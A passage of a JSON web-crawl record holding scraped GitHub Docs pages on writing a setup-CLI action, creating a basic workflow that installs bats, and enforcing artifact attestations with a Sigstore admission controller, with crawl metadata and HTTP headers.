      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "5431:1FB90B:ED4242:135E8B4:681C5133",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:37:39 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21934-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686259.018147, VS0, VE343",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "26190",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Developing a third party CLI action\nLearn how to develop an action to set up a CLI on GitHub Actions runners.\nIntroduction\nYou can write an action to provide a way for users to access your servers via a configured CLI environment on GitHub Actions runners.\nYour action should:\nMake it simple for users to specify the version of the CLI to install\nSupport multiple operating systems\nRun in an efficient fashion to minimize run-time and associated costs\nWork across GitHub-hosted and self-hosted runners\nLeverage community tooling when possible\nThis article will demonstrate how to write an action that retrieves a specific version of your CLI, installs it, adds it to the path, and (optionally) caches it. This type of action (an action that sets up a tool) is often named setup-$TOOL.\nPrerequisites\nYou should have an understanding of how to write a custom action. For more information, see About custom actions. For a more detailed guide on how to write a custom action, see Creating a JavaScript action.\nExample\nThe following script demonstrates how you can get a user-specified version as input, download and extract the specific version of your CLI, then add the CLI to the path.\nGitHub provides actions/toolkit, which is a set of packages that helps you create actions. This example uses the actions/core and actions/tool-cache packages.\nJavaScript\nconst core = require('@actions/core'); const tc = require('@actions/tool-cache'); async function setup() { // Get version of tool to be installed const version = core.getInput('version'); // Download the specific version of the tool, e.g. as a tarball const pathToTarball = await tc.downloadTool(getDownloadURL()); // Extract the tarball onto the runner const pathToCLI = await tc.extractTar(pathToTarball); // Expose the tool by adding it to the PATH core.addPath(pathToCLI) } module.exports = setup \nTo use this script, replace getDownloadURL with a function that downloads your CLI. You will also need to create an actions metadata file (action.yml) that accepts a version input and that runs this script. For full details about how to create an action, see Creating a JavaScript action.\nFurther reading\nThis pattern is employed in several actions. For more examples, see:\nruby/setup-ruby\ngoogle-github-actions/setup-gcloud\nhashicorp/setup-terraform",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-actions-developing-a-third-party-cli-action-rtkwc.html",
  "markdown": "# Developing a third party CLI action\n\nLearn how to develop an action to set up a CLI on GitHub Actions runners.\n\n## [Introduction](#introduction)\n\nYou can write an action to provide a way for users to access your servers via a configured CLI environment on GitHub Actions runners.\n\nYour action should:\n\n*   Make it simple for users to specify the version of the CLI to install\n*   Support multiple operating systems\n*   Run in an efficient fashion to minimize run-time and associated costs\n*   Work across GitHub-hosted and self-hosted runners\n*   Leverage community tooling when possible\n\nThis article will demonstrate how to write an action that retrieves a specific version of your CLI, installs it, adds it to the path, and (optionally) caches it. This type of action (an action that sets up a tool) is often named `setup-$TOOL`.\n\n## [Prerequisites](#prerequisites)\n\nYou should have an understanding of how to write a custom action. For more information, see [About custom actions](https://docs.github.com/en/actions/creating-actions/about-custom-actions). For a more detailed guide on how to write a custom action, see [Creating a JavaScript action](https://docs.github.com/en/actions/creating-actions/creating-a-javascript-action).\n\n## [Example](#example)\n\nThe following script demonstrates how you can get a user-specified version as input, download and extract the specific version of your CLI, then add the CLI to the path.\n\nGitHub provides [`actions/toolkit`](https://github.com/actions/toolkit), which is a set of packages that helps you create actions. This example uses the [`actions/core`](https://github.com/actions/toolkit/tree/main/packages/core) and [`actions/tool-cache`](https://github.com/actions/toolkit/tree/main/packages/tool-cache) packages.\n\nJavaScript\n\n```\nconst core = require('@actions/core');\nconst tc = require('@actions/tool-cache');\n\nasync function setup() {\n  // Get version of tool to be installed\n  const version = core.getInput('version');\n\n  // Download the specific version of the tool, e.g. as a tarball\n  const pathToTarball = await tc.downloadTool(getDownloadURL());\n\n  // Extract the tarball onto the runner\n  const pathToCLI = await tc.extractTar(pathToTarball);\n\n  // Expose the tool by adding it to the PATH\n  core.addPath(pathToCLI)\n}\n\nmodule.exports = setup\n```\n\nTo use this script, replace `getDownloadURL` with a function that downloads your CLI. You will also need to create an actions metadata file (`action.yml`) that accepts a `version` input and that runs this script. For full details about how to create an action, see [Creating a JavaScript action](https://docs.github.com/en/actions/creating-actions/creating-a-javascript-action).\n\n## [Further reading](#further-reading)\n\nThis pattern is employed in several actions. For more examples, see:\n\n*   [`ruby/setup-ruby`](https://github.com/ruby/setup-ruby)\n*   [`google-github-actions/setup-gcloud`](https://github.com/google-github-actions/setup-gcloud)\n*   [`hashicorp/setup-terraform`](https://github.com/hashicorp/setup-terraform)",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 239,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-actions-developing-a-third-party-cli-action-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-actions-developing-a-third-party-cli-action-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-actions-developing-a-third-party-cli-action-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-actions-developing-a-third-party-cli-action-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-sharing-automations-creating-actions-developing-a-third-party-cli-action-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 4500,
      "readableText": 4163,
      "none": 22240,
      "readableTextIfPossible": 22240,
      "result": 4163,
      "markdown": 3039
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/use-cases-and-examples/creating-an-example-workflow",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/use-cases-and-examples/creating-an-example-workflow",
    "loadedTime": "2025-05-08T06:37:47.516Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/use-cases-and-examples/creating-an-example-workflow",
    "title": "Creating an example workflow - GitHub Docs",
    "description": "Learn how to create a basic workflow that is triggered by a push event.",
    "author": null,
    "keywords": "Actions,Workflows",
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Creating an example workflow - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/creating-an-example-workflow"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/use-cases-and-examples/creating-an-example-workflow"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "776D:132AFF:EF10E9:137BB57:681C5134",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:37:41 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21934-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686261.825262, VS0, VE300",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "29061",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Creating an example workflow - GitHub Docs\nLearn how to create a basic workflow that is triggered by a push event.\nIntroduction\nThis guide shows you how to create a basic workflow that is triggered when code is pushed to your repository.\nTo get started with preconfigured workflows, browse through the list of templates in the actions/starter-workflows repository. For more information, see Using workflow templates.\nCreating an example workflow\nGitHub Actions uses YAML syntax to define the workflow. Each workflow is stored as a separate YAML file in your code repository, in a directory named .github/workflows.\nYou can create an example workflow in your repository that automatically triggers a series of commands whenever code is pushed. In this workflow, GitHub Actions checks out the pushed code, installs the bats testing framework, and runs a basic command to output the bats version: bats -v.\nIn your repository, create the .github/workflows/ directory to store your workflow files.\nIn the .github/workflows/ directory, create a new file called learn-github-actions.yml and add the following code.\nYAML\nname: learn-github-actions run-name: ${{ github.actor }} is learning GitHub Actions on: [push] jobs: check-bats-version: runs-on: ubuntu-latest steps: - uses: actions/checkout@v4 - uses: actions/setup-node@v4 with: node-version: '20' - run: npm install -g bats - run: bats -v \nCommit these changes and push them to your GitHub repository.\nYour new GitHub Actions workflow file is now installed in your repository and will run automatically each time someone pushes a change to the repository. To see the details about a workflow's execution history, see Viewing the activity for a workflow run.\nUnderstanding the workflow file\nTo help you understand how YAML syntax is used to create a workflow file, this section explains each line of the introduction's example:\nname: learn-github-actions\nOptional - The name of the workflow as it will appear in the \"Actions\" tab of the GitHub repository. If this field is omitted, the name of the workflow file will be used instead.\nrun-name: ${{ github.actor }} is learning GitHub Actions\nOptional - The name for workflow runs generated from the workflow, which will appear in the list of workflow runs on your repository's \"Actions\" tab. This example uses an expression with the github context to display the username of the actor that triggered the workflow run. For more information, see AUTOTITLE.\nSpecifies the trigger for this workflow. This example uses the push event, so a workflow run is triggered every time someone pushes a change to the repository or merges a pull request. This is triggered by a push to every branch; for examples of syntax that runs only on pushes to specific branches, paths, or tags, see AUTOTITLE.\nGroups together all the jobs that run in the learn-github-actions workflow.\nDefines a job named check-bats-version. The child keys will define properties of the job.\nConfigures the job to run on the latest version of an Ubuntu Linux runner. This means that the job will execute on a fresh virtual machine hosted by GitHub. For syntax examples using other runners, see AUTOTITLE\nGroups together all the steps that run in the check-bats-version job. Each item nested under this section is a separate action or shell script.\n- uses: actions/checkout@v4\nThe uses keyword specifies that this step will run v4 of the actions/checkout action. This is an action that checks out your repository onto the runner, allowing you to run scripts or other actions against your code (such as build and test tools). You should use the checkout action any time your workflow will use the repository's code.\n- uses: actions/setup-node@v4 with: node-version: '20'\nThis step uses the actions/setup-node@v4 action to install the specified version of the Node.js. (This example uses version 20.) This puts both the node and npm commands in your PATH.\n- run: npm install -g bats\nThe run keyword tells the job to execute a command on the runner. In this case, you are using npm to install the bats software testing package.\nFinally, you'll run the bats command with a parameter that outputs the software version.\n# Optional - The name of the workflow as it will appear in the \"Actions\" tab of the GitHub repository. If this field is omitted, the name of the workflow file will be used instead. name: learn-github-actions # Optional - The name for workflow runs generated from the workflow, which will appear in the list of workflow runs on your repository's \"Actions\" tab. This example uses an expression with the `github` context to display the username of the actor that triggered the workflow run. For more information, see [AUTOTITLE](/actions/using-workflows/workflow-syntax-for-github-actions#run-name). run-name: ${{ github.actor }} is learning GitHub Actions # Specifies the trigger for this workflow. This example uses the `push` event, so a workflow run is triggered every time someone pushes a change to the repository or merges a pull request. This is triggered by a push to every branch; for examples of syntax that runs only on pushes to specific branches, paths, or tags, see [AUTOTITLE](/actions/reference/workflow-syntax-for-github-actions#onpushpull_requestpull_request_targetpathspaths-ignore). on: [push] # Groups together all the jobs that run in the `learn-github-actions` workflow. jobs: # Defines a job named `check-bats-version`. The child keys will define properties of the job. check-bats-version: # Configures the job to run on the latest version of an Ubuntu Linux runner. This means that the job will execute on a fresh virtual machine hosted by GitHub. For syntax examples using other runners, see [AUTOTITLE](/actions/reference/workflow-syntax-for-github-actions#jobsjob_idruns-on) runs-on: ubuntu-latest # Groups together all the steps that run in the `check-bats-version` job. Each item nested under this section is a separate action or shell script. steps: # The `uses` keyword specifies that this step will run `v4` of the `actions/checkout` action. This is an action that checks out your repository onto the runner, allowing you to run scripts or other actions against your code (such as build and test tools). You should use the checkout action any time your workflow will use the repository's code. - uses: actions/checkout@v4 # This step uses the `actions/setup-node@v4` action to install the specified version of the Node.js. (This example uses version 20.) This puts both the `node` and `npm` commands in your `PATH`. - uses: actions/setup-node@v4 with: node-version: '20' # The `run` keyword tells the job to execute a command on the runner. In this case, you are using `npm` to install the `bats` software testing package. - run: npm install -g bats # Finally, you'll run the `bats` command with a parameter that outputs the software version. - run: bats -v \nVisualizing the workflow file\nIn this diagram, you can see the workflow file you just created and how the GitHub Actions components are organized in a hierarchy. Each step executes a single action or shell script. Steps 1 and 2 run actions, while steps 3 and 4 run shell scripts. To find more prebuilt actions for your workflows, see Using pre-written building blocks in your workflow.\nViewing the activity for a workflow run\nWhen your workflow is triggered, a workflow run is created that executes the workflow. After a workflow run has started, you can see a visualization graph of the run's progress and view each step's activity on GitHub.\nOn GitHub, navigate to the main page of the repository.\nUnder your repository name, click Actions.\nIn the left sidebar, click the workflow you want to see.\nFrom the list of workflow runs, click the name of the run to see the workflow run summary.\nIn the left sidebar or in the visualization graph, click the job you want to see.\nTo view the results of a step, click the step.",
  "htmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-creating-an-example-workflow-6s97f.html",
  "markdown": "# Creating an example workflow - GitHub Docs\n\nLearn how to create a basic workflow that is triggered by a push event.\n\n## [Introduction](#introduction)\n\nThis guide shows you how to create a basic workflow that is triggered when code is pushed to your repository.\n\nTo get started with preconfigured workflows, browse through the list of templates in the [actions/starter-workflows](https://github.com/actions/starter-workflows) repository. For more information, see [Using workflow templates](https://docs.github.com/en/actions/writing-workflows/using-starter-workflows).\n\n## [Creating an example workflow](#creating-an-example-workflow)\n\nGitHub Actions uses YAML syntax to define the workflow. Each workflow is stored as a separate YAML file in your code repository, in a directory named `.github/workflows`.\n\nYou can create an example workflow in your repository that automatically triggers a series of commands whenever code is pushed. In this workflow, GitHub Actions checks out the pushed code, installs the [bats](https://www.npmjs.com/package/bats) testing framework, and runs a basic command to output the bats version: `bats -v`.\n\n1.  In your repository, create the `.github/workflows/` directory to store your workflow files.\n    \n2.  In the `.github/workflows/` directory, create a new file called `learn-github-actions.yml` and add the following code.\n    \n    YAML\n    \n    ```\n    name: learn-github-actions\n    run-name: ${{ github.actor }} is learning GitHub Actions\n    on: [push]\n    jobs:\n      check-bats-version:\n        runs-on: ubuntu-latest\n        steps:\n          - uses: actions/checkout@v4\n          - uses: actions/setup-node@v4\n            with:\n              node-version: '20'\n          - run: npm install -g bats\n          - run: bats -v\n    ```\n    \n3.  Commit these changes and push them to your GitHub repository.\n    \n\nYour new GitHub Actions workflow file is now installed in your repository and will run automatically each time someone pushes a change to the repository. To see the details about a workflow's execution history, see [Viewing the activity for a workflow run](#viewing-the-activity-for-a-workflow-run).\n\n## [Understanding the workflow file](#understanding-the-workflow-file)\n\nTo help you understand how YAML syntax is used to create a workflow file, this section explains each line of the introduction's example:\n\n```\nname: learn-github-actions\n```\n\nOptional - The name of the workflow as it will appear in the \"Actions\" tab of the GitHub repository. If this field is omitted, the name of the workflow file will be used instead.\n\n```\nrun-name: ${{ github.actor }} is learning GitHub Actions\n```\n\nOptional - The name for workflow runs generated from the workflow, which will appear in the list of workflow runs on your repository's \"Actions\" tab. This example uses an expression with the `github` context to display the username of the actor that triggered the workflow run. For more information, see [AUTOTITLE](https://docs.github.com/actions/using-workflows/workflow-syntax-for-github-actions#run-name).\n\nSpecifies the trigger for this workflow. This example uses the `push` event, so a workflow run is triggered every time someone pushes a change to the repository or merges a pull request. This is triggered by a push to every branch; for examples of syntax that runs only on pushes to specific branches, paths, or tags, see [AUTOTITLE](https://docs.github.com/actions/reference/workflow-syntax-for-github-actions#onpushpull_requestpull_request_targetpathspaths-ignore).\n\nGroups together all the jobs that run in the `learn-github-actions` workflow.\n\nDefines a job named `check-bats-version`. The child keys will define properties of the job.\n\nConfigures the job to run on the latest version of an Ubuntu Linux runner. This means that the job will execute on a fresh virtual machine hosted by GitHub. For syntax examples using other runners, see [AUTOTITLE](https://docs.github.com/actions/reference/workflow-syntax-for-github-actions#jobsjob_idruns-on)\n\nGroups together all the steps that run in the `check-bats-version` job. Each item nested under this section is a separate action or shell script.\n\n```\n      - uses: actions/checkout@v4\n```\n\nThe `uses` keyword specifies that this step will run `v4` of the `actions/checkout` action. This is an action that checks out your repository onto the runner, allowing you to run scripts or other actions against your code (such as build and test tools). You should use the checkout action any time your workflow will use the repository's code.\n\n```\n      - uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n```\n\nThis step uses the `actions/setup-node@v4` action to install the specified version of the Node.js. (This example uses version 20.) This puts both the `node` and `npm` commands in your `PATH`.\n\n```\n      - run: npm install -g bats\n```\n\nThe `run` keyword tells the job to execute a command on the runner. In this case, you are using `npm` to install the `bats` software testing package.\n\nFinally, you'll run the `bats` command with a parameter that outputs the software version.\n\n```\n# Optional - The name of the workflow as it will appear in the \"Actions\" tab of the GitHub repository. If this field is omitted, the name of the workflow file will be used instead.\nname: learn-github-actions\n\n# Optional - The name for workflow runs generated from the workflow, which will appear in the list of workflow runs on your repository's \"Actions\" tab. This example uses an expression with the `github` context to display the username of the actor that triggered the workflow run. For more information, see [AUTOTITLE](/actions/using-workflows/workflow-syntax-for-github-actions#run-name).\nrun-name: ${{ github.actor }} is learning GitHub Actions\n\n# Specifies the trigger for this workflow. This example uses the `push` event, so a workflow run is triggered every time someone pushes a change to the repository or merges a pull request. This is triggered by a push to every branch; for examples of syntax that runs only on pushes to specific branches, paths, or tags, see [AUTOTITLE](/actions/reference/workflow-syntax-for-github-actions#onpushpull_requestpull_request_targetpathspaths-ignore).\non: [push]\n\n# Groups together all the jobs that run in the `learn-github-actions` workflow.\njobs:\n\n# Defines a job named `check-bats-version`. The child keys will define properties of the job.\n  check-bats-version:\n\n# Configures the job to run on the latest version of an Ubuntu Linux runner. This means that the job will execute on a fresh virtual machine hosted by GitHub. For syntax examples using other runners, see [AUTOTITLE](/actions/reference/workflow-syntax-for-github-actions#jobsjob_idruns-on)\n    runs-on: ubuntu-latest\n\n# Groups together all the steps that run in the `check-bats-version` job. Each item nested under this section is a separate action or shell script.\n    steps:\n\n# The `uses` keyword specifies that this step will run `v4` of the `actions/checkout` action. This is an action that checks out your repository onto the runner, allowing you to run scripts or other actions against your code (such as build and test tools). You should use the checkout action any time your workflow will use the repository's code.\n      - uses: actions/checkout@v4\n\n# This step uses the `actions/setup-node@v4` action to install the specified version of the Node.js. (This example uses version 20.) This puts both the `node` and `npm` commands in your `PATH`.\n      - uses: actions/setup-node@v4\n        with:\n          node-version: '20'\n\n# The `run` keyword tells the job to execute a command on the runner. In this case, you are using `npm` to install the `bats` software testing package.\n      - run: npm install -g bats\n\n# Finally, you'll run the `bats` command with a parameter that outputs the software version.\n      - run: bats -v\n```\n\n### [Visualizing the workflow file](#visualizing-the-workflow-file)\n\nIn this diagram, you can see the workflow file you just created and how the GitHub Actions components are organized in a hierarchy. Each step executes a single action or shell script. Steps 1 and 2 run actions, while steps 3 and 4 run shell scripts. To find more prebuilt actions for your workflows, see [Using pre-written building blocks in your workflow](https://docs.github.com/en/actions/learn-github-actions/finding-and-customizing-actions).\n\n![Diagram showing the trigger, runner, and job of a workflow. The job is broken into 4 steps.](https://docs.github.com/assets/cb-34473/images/help/actions/overview-actions-event.png)\n\n## [Viewing the activity for a workflow run](#viewing-the-activity-for-a-workflow-run)\n\nWhen your workflow is triggered, a _workflow run_ is created that executes the workflow. After a workflow run has started, you can see a visualization graph of the run's progress and view each step's activity on GitHub.\n\n1.  On GitHub, navigate to the main page of the repository.\n    \n2.  Under your repository name, click **Actions**.\n    \n    ![Screenshot of the tabs for the \"github/docs\" repository. The \"Actions\" tab is highlighted with an orange outline.](https://docs.github.com/assets/cb-12958/images/help/repository/actions-tab-global-nav-update.png)\n    \n3.  In the left sidebar, click the workflow you want to see.\n    \n    ![Screenshot of the left sidebar of the \"Actions\" tab. A workflow, \"CodeQL,\" is outlined in dark orange.](https://docs.github.com/assets/cb-40551/images/help/actions/superlinter-workflow-sidebar.png)\n    \n4.  From the list of workflow runs, click the name of the run to see the workflow run summary.\n    \n5.  In the left sidebar or in the visualization graph, click the job you want to see.\n    \n6.  To view the results of a step, click the step.",
  "debug": {
    "pageType": "Article",
    "pageTypeReason": "HasUrlDashes",
    "totalLinks": 242,
    "response": {
      "statusCode": 200
    },
    "snapshots": {
      "originalHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-creating-an-example-workflow-originalHtmlUrl",
      "removedElementsHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-creating-an-example-workflow-removedElementsHtmlUrl",
      "extractusHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-creating-an-example-workflow-extractusHtmlUrl",
      "readableTextHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-creating-an-example-workflow-readableTextHtmlUrl",
      "readableTextIfPossibleHtmlUrl": "https://api.apify.com/v2/key-value-stores/vGPOQGGGPeERMVNW8/records/https---docs-github-com-en-actions-use-cases-and-examples-creating-an-example-workflow-readableTextIfPossibleHtmlUrl"
    },
    "lengths": {
      "extractus": 13501,
      "readableText": 13069,
      "none": 40628,
      "readableTextIfPossible": 13069,
      "result": 13069,
      "markdown": 9743
    },
    "requestHandlerMode": "browser"
  }
},
{
  "url": "https://docs.github.com/en/actions/security-for-github-actions/using-artifact-attestations/enforcing-artifact-attestations-with-a-kubernetes-admission-controller",
  "crawl": {
    "loadedUrl": "https://docs.github.com/en/actions/security-for-github-actions/using-artifact-attestations/enforcing-artifact-attestations-with-a-kubernetes-admission-controller",
    "loadedTime": "2025-05-08T06:37:51.112Z",
    "referrerUrl": "https://docs.github.com/en/actions",
    "depth": 1,
    "httpStatusCode": 200
  },
  "metadata": {
    "canonicalUrl": "https://docs.github.com/en/actions/security-for-github-actions/using-artifact-attestations/enforcing-artifact-attestations-with-a-kubernetes-admission-controller",
    "title": "Enforcing artifact attestations with a Kubernetes admission controller - GitHub Docs",
    "description": "Use an admission controller to enforce artifact attestations in your Kubernetes cluster.",
    "author": null,
    "keywords": null,
    "languageCode": "en",
    "openGraph": [
      {
        "property": "og:site_name",
        "content": "GitHub Docs"
      },
      {
        "property": "og:title",
        "content": "Enforcing artifact attestations with a Kubernetes admission controller - GitHub Docs"
      },
      {
        "property": "og:type",
        "content": "article"
      },
      {
        "property": "og:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/using-artifact-attestations/enforcing-artifact-attestations-with-a-kubernetes-admission-controller"
      },
      {
        "property": "og:image",
        "content": "https://docs.github.com/assets/cb-345/images/social-cards/actions.png"
      },
      {
        "property": "twitter:domain",
        "content": "docs-internal.github.com"
      },
      {
        "property": "twitter:url",
        "content": "https://docs-internal.github.com/en/actions/security-for-github-actions/using-artifact-attestations/enforcing-artifact-attestations-with-a-kubernetes-admission-controller"
      }
    ],
    "jsonLd": null,
    "headers": {
      "access-control-allow-origin": "*",
      "content-security-policy": "default-src 'none';prefetch-src 'self';connect-src 'self';font-src 'self' data:;img-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com data: placehold.it;object-src 'self';script-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' data:;script-src-attr 'self';frame-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com https://support.github.com https://www.youtube-nocookie.com;frame-ancestors 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com;style-src 'self' github.com *.github.com *.githubusercontent.com *.githubassets.com 'self' 'unsafe-inline' data:;child-src 'self';manifest-src 'self';upgrade-insecure-requests;base-uri 'self';form-action 'self'",
      "cross-origin-opener-policy": "same-origin",
      "cross-origin-resource-policy": "same-origin",
      "origin-agent-cluster": "?1",
      "referrer-policy": "no-referrer-when-downgrade",
      "x-content-type-options": "nosniff",
      "x-dns-prefetch-control": "off",
      "x-download-options": "noopen",
      "x-frame-options": "SAMEORIGIN",
      "x-permitted-cross-domain-policies": "none",
      "x-xss-protection": "0",
      "cache-control": "public, max-age=60",
      "x-powered-by": "Next.js",
      "content-type": "text/html; charset=utf-8",
      "x-github-backend": "Kubernetes",
      "x-github-request-id": "E9B6:203D3B:CDC412:11665F6:681C5137",
      "content-encoding": "br",
      "accept-ranges": "bytes",
      "age": "0",
      "date": "Thu, 08 May 2025 06:37:44 GMT",
      "via": "1.1 varnish",
      "x-served-by": "cache-lga21934-LGA",
      "x-cache": "MISS",
      "x-cache-hits": "0",
      "x-timer": "S1746686264.727438, VS0, VE314",
      "vary": "Accept-Encoding",
      "strict-transport-security": "max-age=31557600",
      "content-length": "28836",
      "x-firefox-spdy": "h2"
    }
  },
  "screenshotUrl": null,
  "text": "Enforcing artifact attestations with a Kubernetes admission controller\nUse an admission controller to enforce artifact attestations in your Kubernetes cluster.\nAbout Kubernetes admission controller\nArtifact attestations enable you to create unfalsifiable provenance and integrity guarantees for the software you build. In turn, people who consume your software can verify where and how your software was built.\nKubernetes admission controllers are plugins that govern the behavior of the Kubernetes API server. They are commonly used to enforce security policies and best practices in a Kubernetes cluster.\nUsing the open source Sigstore Policy Controller project you can add an admission controller to your Kubernetes cluster that can enforce artifact attestations. This way, you can ensure that only artifacts with valid attestations can be deployed.\nTo install the controller, we offer two Helm charts: one for deploying the Sigstore Policy Controller, and another for loading the GitHub trust root and a default policy.\nAbout image verification\nWhen the Policy Controller is installed, it will intercept all image pull requests and verify the attestation for the image. The attestation must be stored in the image registry as an OCI attached artifact containing a Sigstore Bundle which contains the attestation and cryptographic material (e.g. certificates and signatures) used to verify the attestation. A verification process is then performed that ensures the image was built with the specified build provenance and matches any policies enabled by the cluster administrator.\nIn order for an image to be verifiable, it must have a valid provenance attestation in the registry, which can be done by enabling the push-to-registry: true attribute in the actions/attest-build-provenance action. See Generating build provenance for container images for more details on how to generate attestations for container images.\nAbout trust roots and policies\nThe Sigstore Policy Controller is primarily configured with trust roots and policies, represented by the Custom Resources TrustRoot and ClusterImagePolicy. A TrustRoot represents a trusted distribution channel for the public key material used to verify attestations. A ClusterImagePolicy represents a policy for enforcing attestations on images.\nA TrustRoot may also contain a TUF repository root, making it possible for your cluster to continuously and securely receive updates to its trusted public key material. If left unspecified, a ClusterImagePolicy will by default use the open source Sigstore Public Good Instance's key material. When verifying attestations generated for private repositories, the ClusterImagePolicy must reference the GitHub TrustRoot.\nGetting started with Kubernetes admission controller\nTo set up an admission controller for enforcing GitHub artifact attestations, you need to:\nDeploy the Sigstore Policy Controller.\nAdd the GitHub TrustRoot and a ClusterImagePolicy to your cluster.\nEnable the policy in your namespace.\nDeploy the Sigstore Policy Controller\nWe have packaged the Sigstore Policy Controller as a GitHub distributed Helm chart. Before you begin, ensure you have the following prerequisites:\nA Kubernetes cluster with version 1.27 or later\nHelm 3.0 or later\nkubectl\nFirst, install the Helm chart that deploys the Sigstore Policy Controller:\nBash\nhelm upgrade policy-controller --install --atomic \\ --create-namespace --namespace artifact-attestations \\ oci://ghcr.io/github/artifact-attestations-helm-charts/policy-controller \\ --version v0.12.0-github12 \nThis installs the Policy Controller into the artifact-attestations namespace. At this point, no policies have been configured, and it will not enforce any attestations.\nAdd the GitHub TrustRoot and a ClusterImagePolicy\nOnce the policy controller has been deployed, you need to add the GitHub TrustRoot and a ClusterImagePolicy to your cluster. Use the Helm chart we provide to do this. Make sure to replace MY-ORGANIZATION with your GitHub organization's name (e.g., github or octocat-inc).\nBash\nhelm upgrade trust-policies --install --atomic \\ --namespace artifact-attestations \\ oci://ghcr.io/github/artifact-attestations-helm-charts/trust-policies \\ --version v0.6.2 \\ --set policy.enabled=true \\ --set policy.organization=MY-ORGANIZATION \nYou've now installed the GitHub trust root, and an artifact attestation policy into your cluster. This policy will reject artifacts that have not originated from within your GitHub organization.\nEnable the policy in your namespace\nWarning\nThis policy will not be enforced until you specify which namespaces it should apply to.\nEach namespace in your cluster can independently enforce 